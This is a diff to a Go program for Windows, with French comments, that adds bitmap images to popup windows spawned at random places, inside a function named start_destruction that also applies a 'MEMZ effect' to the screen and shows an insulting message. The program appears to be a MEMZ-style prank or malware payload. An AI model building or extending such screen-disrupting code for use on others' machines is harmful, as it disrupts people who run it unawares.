@@ -58,6 +58,10 @@ var (
 	showWindow     = user32.NewProc("ShowWindow")
 	setText        = user32.NewProc("SetWindowTextW")
 	textOut        = user32.NewProc("TextOutW")
+
+	//var pour afficher l'image
+	loadImage   = user32.NewProc("LoadImageW")
+	sendMessage = user32.NewProc("SendMessageW")
 )
 
 const (
@@ -70,6 +74,11 @@ const (
 const (
 	SM_CXSCREEN = 0 // Largeur de l'écran principal
 	SM_CYSCREEN = 1 // Hauteur de l'écran principal
+
+	//pour afficher l'image
+	STM_SETIMAGE    = 0x0172
+	IMAGE_BITMAP    = 0
+	LR_LOADFROMFILE = 0x0010
 )
 
 // GetSystemMetrics retourne les dimensions de l'écran
@@ -98,24 +107,34 @@ func MEMZEffect(hdcScreen, hdcMem uintptr, screenWidth, screenHeight int32) {
 	}
 }
 
-func createMessageWindow(text string) uintptr {
-	rand.Seed(time.Now().UnixNano()) // Initialiser le générateur de nombres aléatoires
-
-	// Générer des positions aléatoires pour X et Y
-	x := rand.Intn(800) // Plage de position X (ajuste en fonction de la résolution)
-	y := rand.Intn(600) // Plage de position Y (ajuste en fonction de la résolution)
+func createMessageWindow(text string, imagePath string) uintptr {
+	rand.Seed(time.Now().UnixNano())
+	x := rand.Intn(800)
+	y := rand.Intn(600)
 
 	className := syscall.StringToUTF16Ptr("Static")
 	windowName := syscall.StringToUTF16Ptr(text)
 
 	hwnd, _, _ := createWindowEx.Call(
-		0,                                   // ExStyle
-		uintptr(unsafe.Pointer(className)),  // ClassName
-		uintptr(unsafe.Pointer(windowName)), // WindowName
-		WS_OVERLAPPEDWINDOW|WS_VISIBLE,      // Style
-		uintptr(x), uintptr(y), 500, 100,    // Position (X, Y, Width, Height)
-		0, 0, 0, 0, // Parent, Menu, Instance, Param
+		0,
+		uintptr(unsafe.Pointer(className)),
+		uintptr(unsafe.Pointer(windowName)),
+		WS_OVERLAPPEDWINDOW|WS_VISIBLE,
+		uintptr(x), uintptr(y), 500, 300,
+		0, 0, 0, 0,
 	)
+
+	// Charger l'image
+	imgPathPtr := syscall.StringToUTF16Ptr(imagePath)
+	hBitmap, _, _ := loadImage.Call(
+		0, uintptr(unsafe.Pointer(imgPathPtr)), IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE,
+	)
+
+	// Afficher l'image dans la fenêtre
+	if hBitmap != 0 {
+		sendMessage.Call(hwnd, STM_SETIMAGE, IMAGE_BITMAP, hBitmap)
+	}
+
 	return hwnd
 }
 
@@ -160,7 +179,7 @@ func start_destruction() {
 		// Appliquer l'effet MEMZ
 		MEMZEffect(hdcScreen, hdcMem, screenWidth, screenHeight)
 
-		hwnd := createMessageWindow("Ta mère la chauve")
+		hwnd := createMessageWindow("Ta mère la chauve", "GTOUTPRI.png")
 
 		// Afficher la fenêtre
 		showWindow.Call(hwnd, SW_SHOWNORMAL)
